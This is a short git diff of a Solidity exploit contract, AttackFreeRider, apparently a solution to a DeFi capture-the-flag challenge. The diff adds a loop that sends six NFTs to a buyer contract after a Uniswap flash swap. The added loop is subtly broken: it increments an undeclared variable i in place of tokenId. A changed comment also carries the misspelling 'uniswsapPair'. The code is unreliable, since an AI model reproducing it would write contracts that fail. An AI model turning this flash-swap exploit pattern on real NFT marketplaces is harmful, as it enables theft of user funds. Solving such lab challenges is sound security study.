@@ -55,9 +55,14 @@ contract AttackFreeRider {
     function attack(uint256 _amount) external {
         //Initiate flash swap to get WETH
         uniswapPair.swap(_amount, 0, address(this), new bytes(1));
+
+        //After flash swap, transfer NFTs to buyer
+        for (uint256 tokenId = 0; tokenId < 6; i++) {
+            dvNFT.safeTransferFrom(address(this), address(nftBuyer), tokenId);
+        }
     }
 
-    //Called during flash swap
+    //Called by uniswsapPair during flash swap
     function uniswapV2Call(
         address sender,
         uint256 amount0,
